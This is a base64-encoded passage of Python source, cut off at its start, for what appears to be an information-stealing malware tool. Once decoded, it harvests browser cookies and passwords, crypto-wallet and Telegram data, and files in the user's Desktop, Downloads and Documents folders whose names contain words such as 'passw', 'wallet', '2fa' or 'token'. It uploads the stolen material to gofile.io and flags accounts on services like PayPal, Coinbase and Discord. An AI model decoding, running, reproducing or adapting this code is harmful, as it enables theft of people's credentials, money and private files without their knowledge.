cuVGhyZWFkKHRhcmdldD1nZXRDMDBrMTMsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNF1dKQogICAgICAgICAgICBhLnN0YXJ0KCkKICAgICAgICAgICAgVGhDb2trLmFwcGVuZChhKQoKICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1HYXRoZXJaaXBzLCBhcmdzPVticm93c2VyUGF0aHMsIFBhdGhzVG9aaXAsIFRlbGVncmFtXSkuc3RhcnQoKQoKCiAgICAgICAgZm9yIHRocmVhZCBpbiBUaENva2s6IHRocmVhZC5qb2luKCkKICAgICAgICBERVRFQ1RFRCA9IFRSNnN0KEMwMGsxMykKICAgICAgICBpZiBERVRFQ1RFRCA9PSBUcnVlOiByZXR1cm4KCiAgICAgICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOgogICAgICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aMXBUaDFuZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKS5zdGFydCgpCiAgICAgICAgCiAgICAgICAgZm9yIHBhdHQgaW4gUGF0aHNUb1ppcDoKICAgICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WjFwVGgxbmdzLCBhcmdzPVtwYXR0WzBdLCBwYXR0WzJdLCBwYXR0WzFdXSkuc3RhcnQoKQogICAgICAgIAogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRlbGVncmFtLCBhcmdzPVtUZWxlZ3JhbVswXSwgVGVsZWdyYW1bMl0sIFRlbGVncmFtWzFdXSkuc3RhcnQoKQoKICAgICAgICBmb3IgdGhyZWFkIGluIFRocmVhZGxpc3Q6IAogICAgICAgICAgICB0aHJlYWQuam9pbigpCiAgICAgICAgZ2xvYmFsIHVwdGhzCiAgICAgICAgdXB0aHMgPSBbXQoKICAgICAgICBmb3IgZmlsZSBpbiBbImNycGFzc3cudHh0IiwgImNyY29vay50eHQiXTogCiAgICAgICAgICAgICMgdXBsb2FkKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpCiAgICAgICAgICAgIHVwbG9hZChmaWxlLnJlcGxhY2UoIi50eHQiLCAiIiksIHVwbG9hZFRvQW5vbmZpbGVzKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpKQoKICAgIGRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToKICAgICAgICB0cnk6cmV0dXJuIHJlcXVlc3RzLnBvc3QoZidodHRwczovL3tyZXF1ZXN0cy5nZXQoImh0dHBzOi8vYXBpLmdvZmlsZS5pby9nZXRTZXJ2ZXIiKS5qc29uKClbImRhdGEiXVsic2VydmVyIl19LmdvZmlsZS5pby91cGxvYWRGaWxlJywgZmlsZXM9eydmaWxlJzogb3BlbihwYXRoLCAncmInKX0pLmpzb24oKVsiZGF0YSJdWyJkb3dubG9hZFBhZ2UiXQogICAgICAgIGV4Y2VwdDpyZXR1cm4gRmFsc2UKCiAgICAjIGRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKTpzCiAgICAjICAgICB0cnk6CiAgICAjICAgICAgICAgZmlsZXMgPSB7ICJmaWxlIjogKHBhdGgsIG9wZW4ocGF0aCwgbW9kZT0ncmInKSkgfQogICAgIyAgICAgICAgIHVwbG9hZCA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vdHJhbnNmZXIuc2gvIiwgZmlsZXM9ZmlsZXMpCiAgICAjICAgICAgICAgdXJsID0gdXBsb2FkLnRleHQKICAgICMgICAgICAgICByZXR1cm4gdXJsCiAgICAjICAgICBleGNlcHQ6CiAgICAjICAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgZGVmIEtpd2lGb2xkZXIocGF0aEYsIGtleXdvcmRzKToKICAgICAgICBnbG9iYWwgS2l3aUZpbGVzCiAgICAgICAgbWF4ZmlsZXNwZXJkaXIgPSA3CiAgICAgICAgaSA9IDAKICAgICAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoRikKICAgICAgICBmZm91bmQgPSBbXQogICAgICAgIGZvciBmaWxlIGluIGxpc3RPZkZpbGU6CiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoRiArICIvIiArIGZpbGUpOiByZXR1cm4KICAgICAgICAgICAgaSArPSAxCiAgICAgICAgICAgIGlmIGkgPD0gbWF4ZmlsZXNwZXJkaXI6CiAgICAgICAgICAgICAgICB1cmwgPSB1cGxvYWRUb0Fub25maWxlcyhwYXRoRiArICIvIiArIGZpbGUpCiAgICAgICAgICAgICAgICBmZm91bmQuYXBwZW5kKFtwYXRoRiArICIvIiArIGZpbGUsIHVybF0pCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgIEtpd2lGaWxlcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoRiArICIvIiwgZmZvdW5kXSkKCiAgICBLaXdpRmlsZXMgPSBbXQogICAgZGVmIEtpd2lGaWxlKHBhdGgsIGtleXdvcmRzKToKICAgICAgICBnbG9iYWwgS2l3aUZpbGVzCiAgICAgICAgZmlmb3VuZCA9IFtdCiAgICAgICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkKICAgICAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoKICAgICAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOgogICAgICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHBhdGggKyAiLyIgKyBmaWxlKSBhbmQgIi50eHQiIGluIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToKICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUKICAgICAgICAgICAgICAgICAgICAgICAgS2l3aUZvbGRlcih0YXJnZXQsIGtleXdvcmRzKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgICAgICBLaXdpRmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aCwgZmlmb3VuZF0pCgogICAgZGVmIEtpd2koKToKICAgICAgICB1c2VyID0gdGVtcC5zcGxpdCgiXEFwcERhdGEiKVswXQogICAgICAgIHBhdGgyc2VhcmNoID0gWwogICAgICAgICAgICB1c2VyICsgIi9EZXNrdG9wIiwKICAgICAgICAgICAgdXNlciArICIvRG93bmxvYWRzIiwKICAgICAgICAgICAgdXNlciArICIvRG9jdW1lbnRzIgogICAgICAgIF0KCiAgICAgICAga2V5X3dvcmRzRm9sZGVyID0gWwogICAgICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgICAgICJhY291bnQiLAogICAgICAgICAgICAicGFzc3ciLAogICAgICAgICAgICAic2VjcmV0IiwKICAgICAgICAgICAgInNlbmhhcyIsCiAgICAgICAgICAgICJjb250YXMiLAogICAgICAgICAgICAiYmFja3VwIiwKICAgICAgICAgICAgIjJmYSIsCiAgICAgICAgICAgICJpbXBvcnRhbnRlIiwKICAgICAgICAgICAgInByaXZhZG8iLAogICAgICAgICAgICAiZXhvZHVzIiwKICAgICAgICAgICAgImV4cG9zZWQiLAogICAgICAgICAgICAicGVyZGVyIiwKICAgICAgICAgICAgImFtaWdvcyIsCiAgICAgICAgICAgICJlbXByZXNhIiwKICAgICAgICAgICAgInRyYWJhbGhvIiwKICAgICAgICAgICAgIndvcmsiLAogICAgICAgICAgICAicHJpdmF0ZSIsCiAgICAgICAgICAgICJzb3VyY2UiLAogICAgICAgICAgICAidXNlcnMiLAogICAgICAgICAgICAidXNlcm5hbWUiLAogICAgICAgICAgICAibG9naW4iLAogICAgICAgICAgICAidXNlciIsCiAgICAgICAgICAgICJ1c3VhcmlvIiwKICAgICAgICAgICAgImxvZyIKICAgICAgICBdCgogICAgICAgIGtleV93b3Jkc0ZpbGVzID0gWwogICAgICAgICAgICAicGFzc3ciLAogICAgICAgICAgICAibWRwIiwKICAgICAgICAgICAgIm1vdGRlcGFzc2UiLAogICAgICAgICAgICAibW90X2RlX3Bhc3NlIiwKICAgICAgICAgICAgImxvZ2luIiwKICAgICAgICAgICAgInNlY3JldCIsCiAgICAgICAgICAgICJhY2NvdW50IiwKICAgICAgICAgICAgImFjb3VudCIsCiAgICAgICAgICAgICJwYXlwYWwiLAogICAgICAgICAgICAiYmFucXVlIiwKICAgICAgICAgICAgImFjY291bnQiLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgIm1ldGFtYXNrIiwKICAgICAgICAgICAgIndhbGxldCIsCiAgICAgICAgICAgICJjcnlwdG8iLAogICAgICAgICAgICAiZXhvZHVzIiwKICAgICAgICAgICAgImRpc2NvcmQiLAogICAgICAgICAgICAiMmZhIiwKICAgICAgICAgICAgImNvZGUiLAogICAgICAgICAgICAibWVtbyIsCiAgICAgICAgICAgICJjb21wdGUiLAogICAgICAgICAgICAidG9rZW4iLAogICAgICAgICAgICAiYmFja3VwIiwKICAgICAgICAgICAgInNlY3JldCIsCiAgICAgICAgICAgICJtb20iLAogICAgICAgICAgICAiZmFtaWx5IgogICAgICAgICAgICBdCgogICAgICAgIHdpa2l0aCA9IFtdCiAgICAgICAgZm9yIHBhdHQgaW4gcGF0aDJzZWFyY2g6IAogICAgICAgICAgICBraXdpID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9S2l3aUZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXSk7a2l3aS5zdGFydCgpCiAgICAgICAgICAgIHdpa2l0aC5hcHBlbmQoa2l3aSkKICAgICAgICByZXR1cm4gd2lraXRoCgoKICAgIGdsb2JhbCBrZXl3b3JkLCBjb29raVdvcmRzLCBwYXN3V29yZHMsIENvb2tpQ291bnQsIFA0c3N3Q291bnQsIFdhbGxldHNaaXAsIEdhbWluZ1ppcCwgT3RoZXJaaXAKCiAgICBrZXl3b3JkID0gWwogICAgICAgICdtYWlsJywgJ1tjb2luYmFzZV0oaHR0cHM6Ly9jb2luYmFzZS5jb20pJywgJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsICdbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKScsICdbc3RlYW1dKGh0dHBzOi8vc3RlYW0uY29tKScsICdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCAnW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKScsICdbeW91dHViZV0oaHR0cHM6Ly95b3V0dWJlLmNvbSknLCAnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsICdbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pJywgJ1t0d2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKScsICdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsICdjYXJkJywgJ1tlcGljZ2FtZXNdKGh0dHBzOi8vZXBpY2dhbWVzLmNvbSknLCAnW3Nwb3RpZnldKGh0dHBzOi8vc3BvdGlmeS5jb20pJywgJ1t5YWhvb10oaHR0cHM6Ly95YWhvby5jb20pJywgJ1tyb2Jsb3hdKGh0dHBzOi8vcm9ibG94LmNvbSknLCAnW3R3aXRjaF0oaHR0cHM6Ly90d2l0Y2guY29tKScsICdbbWluZWNyYWZ0XShodHRwczovL21pbmVjcmFmdC5uZXQpJywgJ2JhbmsnLCAnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsICdbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pJywgJ1thbWF6b25dKGh0dHBzOi8vYW1hem9uLmNvbSknLCAnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywgJ1thbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKScsICdbcGxheXN0YXRpb25dKGh0dHBzOi8vcGxheXN0YXRpb24uY29tKScsICdbaGJvXShodHRwczovL2hiby5jb20pJywgJ1t4Ym94XShodHRwczovL3hib3guY29tKScsICdidXknLCAnc2VsbCcsICdbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSknLCAnW2hvdG1haWxdKGh0dHBzOi8vaG90bWFpbC5jb20pJywgJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsICdbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKScsICdbdGVsZWdyYW1dKGh0dHBzOi8vdGVsZWdyYW0uY29tKScsICdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCAnW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKScsICdbZXhwcmVzc3Zwbl0oaHR0cHM6Ly9leHByZXNzdnBuLmNvbSknLCAnY3J5cHRvJywgJ1t1YmVyXShodHRwczovL3ViZXIuY29tKScsICdbbmV0ZmxpeF0oaHR0cHM6Ly9uZXRmbGl4LmNvbSknCiAgICBdCgogICAgQ29va2lDb3VudCwgUDRzc3dDb3VudCA9IDAsIDAKICAgIGNvb2tpV29yZHMgPSBbXQogICAgcGFzd1dvcmRzID0gW10KCiAgICBXYWxsZXRzWmlwID0gW10gIyBbTmFtZSwgTGlua10KICAgIEdhbWluZ1ppcCA9IFtdCiAgICBPdGhlclppcCA9IFtdCgogICAgR2F0aGVyQWxsKCkKICAgIERFVEVDVEVEID0gVFI2c3QoQzAwazEzKQogICAgIyBERVRFQ1RFRCA9IEZhbHNlCiAgICBpZiBub3QgREVURUNURUQ6CiAgICAgICAgd2lraXRoID0gS2l3aSgpCgogICAgICAgIGZvciB0aHJlYWQgaW4gd2lraXRoOiB0aHJlYWQuam9pbigpCiAgICAgICAgdGltZS5zbGVlcCgwLjIpCgogICAgICAgIGZpbGV0ZXh0ID0gIlxuIgogICAgICAgIGZvciBhcmcgaW4gS2l3aUZpbGVzOgogICAgICAgICAgICBpZiBsZW4oYXJnWzJdKSAhPSAwOgogICAgICAgICAgICAgICAgZm9sZHBhdGggPSBhcmdbMV0KICAgICAgICAgICAgICAgIGZvbGRsaXN0ID0gYXJnWzJdICAgICAgIAogICAgICAgICAgICAgICAgZmlsZXRleHQgKz0gZiLwn5OBIHtmb2xkcGF0aH1cbiIKCiAgICAgICAgICAgICAgICBmb3IgZmZpbCBpbiBmb2xkbGlzdDoKICAgICAgICAgICAgICAgICAgICBhID0gZmZpbFswXS5zcGxpdCgiLyIpCiAgICAgICAgICAgICAgICAgICAgZmlsZWFubWUgPSBhW2xlbihhKS0xXQogICAgICAgICAgICAgICAgICAgIGIgPSBmZmlsWzFdCiAgICAgICAgICAgICAgICAgICAgZmlsZXRleHQgKz0gZiLilJTilIA6b3Blbl9maWxlX2ZvbGRlcjogW3tmaWxlYW5tZX1dKHtifSlcbiIKICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9ICJcbiIKICAgICAgICB1cGxvYWQoImtpd2kiLCBmaWxldGV4dCkKCmNvbG9yKCk=
